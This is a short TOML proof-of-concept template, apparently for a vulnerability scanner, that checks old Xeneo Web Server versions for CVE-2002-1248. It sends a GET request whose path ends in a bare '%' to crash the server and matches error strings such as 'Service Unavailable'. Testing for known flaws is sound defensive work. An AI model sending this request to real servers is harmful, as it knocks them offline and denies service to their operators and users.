[info]
author = "ave"
description = "向 Xeneo Web Server 发送包含 % 编码字符的 GET 请求 URI，触发服务器解析异常导致进程崩溃，造成拒绝服务。该漏洞影响 2.1.0.0、2.0.759.6 及 2.1.5 之前版本。"
id = "POC-AVE-2002-0565"
name = "Northern Solutions Xeneo Web Server 编码URL拒绝服务 PoC"
severity = "medium"
tags = ["ave-2002-0565"]
vuln_id = [
    "CVE-2002-1248",
    "AVE-2002-0565",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/%"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "connection refused",
]
